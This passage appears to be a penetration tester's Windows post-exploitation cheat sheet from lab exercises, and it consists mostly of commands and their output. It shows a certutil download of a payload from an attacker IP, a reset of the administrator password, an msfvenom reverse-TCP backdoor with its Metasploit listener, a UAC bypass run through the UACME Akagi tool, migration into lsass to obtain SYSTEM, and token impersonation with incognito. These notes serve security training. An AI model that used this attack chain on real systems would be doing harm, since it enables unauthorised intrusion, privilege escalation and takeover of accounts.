
* [Privilege Constants (Authorization)](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
* [Priv2Admin](https://github.com/gtworek/Priv2Admin)
    * Translate Windows OS privileges to privesc vectors


## Download a File

```bash
certutil -urlcache -f http://10.10.22.8/met.exe met.exe
```

## Change user password

```bash
C:\Windows\system32>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest
The command completed with one or more errors.


C:\Windows\system32>net user administrator hacker_123
net user administrator hacker_123
The command completed successfully.
```

## Get System Information
```bash
meterpreter > getuid
Server username: VICTIM\admin


meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows


meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

## Migrate to a 64 Bits Process

```bash
meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > pgrep explorer
2336

meterpreter > migrate 2336
[*] Migrating from 2088 to 2336...
[*] Migration completed successfully.

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

## Enumerate Users And Groups

```bash
C:\Windows\system32>net user
net user

User accounts for \\VICTIM

-------------------------------------------------------------------------------
admin                    Administrator            Guest
The command completed successfully.


C:\Windows\system32>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
admin
Administrator
The command completed successfully.
```

## Enumerate Information About the Server

```bash
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

```bash
C:\hfs>hostname
hostname
WIN-OMCNBKR66MN

C:\hfs>systeminfo
systeminfo

Host Name:                 WIN-OMCNBKR66MN
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00252-70000-00000-AA535
Original Install Date:     9/10/2020, 9:10:37 AM
System Boot Time:          4/2/2024, 11:22:00 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2394 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     1,024 MB
Available Physical Memory: 572 MB
Virtual Memory: Max Size:  9,216 MB
Virtual Memory: Available: 8,594 MB
Virtual Memory: In Use:    622 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WIN-OMCNBKR66MN
Hotfix(s):                 208 Hotfix(s) Installed.
                           [01]: KB2894856
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2919442
                           [05]: KB2934520
...
                           [206]: KB4566425
                           [207]: KB4569753
                           [208]: KB4571703
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.4.16.1
                                 IP address(es)
                                 [01]: 10.4.16.42
                                 [02]: fe80::503c:c349:b060:acb1
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

#### Updates

```bash
C:\hfs>wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn
Caption                                     Description      HotFixID   InstalledOn
http://support.microsoft.com/?kbid=2894856  Security Update  KB2894856  10/15/2014
http://support.microsoft.com/?kbid=2896496  Update           KB2896496  6/20/2014
http://support.microsoft.com/?kbid=2919355  Update           KB2919355  3/18/2014
http://support.microsoft.com/?kbid=2919442  Update           KB2919442  3/18/2014
http://support.microsoft.com/?kbid=2934520  Update           KB2934520  1/13/2015
http://support.microsoft.com/?kbid=2938066  Update           KB2938066  7/10/2014
http://support.microsoft.com/?kbid=2938772  Update           KB2938772  3/18/2014
http://support.microsoft.com/?kbid=2949621  Hotfix           KB2949621  3/18/2014
http://support.microsoft.com/?kbid=2954879  Update           KB2954879  5/17/2014
http://support.microsoft.com/?kbid=2955164  Update           KB2955164  5/17/2014
http://support.microsoft.com/?kbid=2959626  Hotfix           KB2959626  7/10/2014
http://support.microsoft.com/?kbid=2965500  Update           KB2965500  5/17/2014
http://support.microsoft.com/?kbid=2967917  Update           KB2967917  7/10/2014
http://support.microsoft.com/?kbid=2969339  Update           KB2969339  6/20/2014
http://support.microsoft.com/?kbid=2971203  Update           KB2971203  7/10/2014
http://support.microsoft.com/?kbid=2973448  Update           KB2973448  6/20/2014
http://support.microsoft.com/?kbid=2975061  Update           KB2975061  7/10/2014
http://support.microsoft.com/?kbid=2975719  Update           KB2975719  10/15/2014
http://support.microsoft.com/?kbid=2977765  Security Update  KB2977765  10/15/2014
http://support.microsoft.com/?kbid=2978041  Security Update  KB2978041  10/15/2014
http://support.microsoft.com/?kbid=2978126  Security Update  KB2978126  11/18/2014
http://support.microsoft.com/?kbid=2984006  Update           KB2984006  10/15/2014
http://support.microsoft.com/?kbid=2989647  Update           KB2989647  10/15/2014
http://support.microsoft.com/?kbid=2989930  Update           KB2989930  12/9/2014
http://support.microsoft.com/?kbid=2993100  Update           KB2993100  10/15/2014
http://support.microsoft.com/?kbid=2995004  Update           KB2995004  10/15/2014
http://support.microsoft.com/?kbid=2995388  Update           KB2995388  10/15/2014
http://support.microsoft.com/?kbid=2996799  Hotfix           KB2996799  10/15/2014

...
```


## Defeat Windows User Account Control 

Create meterpreter payload

```bash
root@attackdefense:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.22.7 LPORT=1234 -f exe > backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
root@attackdefense:~# file backdoor.exe
backdoor.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

Start listener

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > set LHOST 10.10.22.7
LHOST => 10.10.22.7

msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.22.7:1234
```

Launch the payload with Akagi

```bash
meterpreter > cd c:\\

meterpreter > mkdir Temp
Creating directory: Temp

meterpreter > cd Temp

meterpreter > upload backdoor.exe
[*] uploading  : /root/backdoor.exe -> backdoor.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/backdoor.exe -> backdoor.exe
[*] uploaded   : /root/backdoor.exe -> backdoor.exe

meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe
[*] uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] uploaded   : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe

meterpreter > ls
Listing: C:\Temp
================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  199168  fil   2024-01-25 18:13:12 +0530  Akagi64.exe
100777/rwxrwxrwx  73802   fil   2024-01-25 18:12:46 +0530  backdoor.exe

meterpreter > shell
Process 2840 created.
Channel 5 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Temp>.\Akagi64.exe 23 C:\Temp\backdoor.exe
.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

Get the hit and migrate to lsass

```bash
[*] Meterpreter session 1 opened (10.10.22.7:1234 -> 10.4.17.147:49383) at 2024-01-25 18:16:13 +0530

meterpreter > getuid
Server username: VICTIM\admin

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege


meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 236   4     smss.exe              x64   0
...
 480   396   services.exe          x64   0
 488   396   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 560   480   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 604   480   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
...
 2840  2336  cmd.exe               x64   1        VICTIM\admin                  C:\Windows\System32\cmd.exe

meterpreter > migrate 488
[*] Migrating from 1332 to 488...
[*] Migration completed successfully.

meterpreter > sysinfo
Computer        : VICTIM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## Impersonate User Tokens With incognito

```bash
meterpreter > load incognito
Loading extension incognito...Success.

meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available


meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator

meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator

meterpreter > getprivs
[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.

meterpreter > pgrep explorer
3532

meterpreter > migrate 3532
[*] Migrating from 4108 to 3532...
[*] Migration completed successfully.

meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```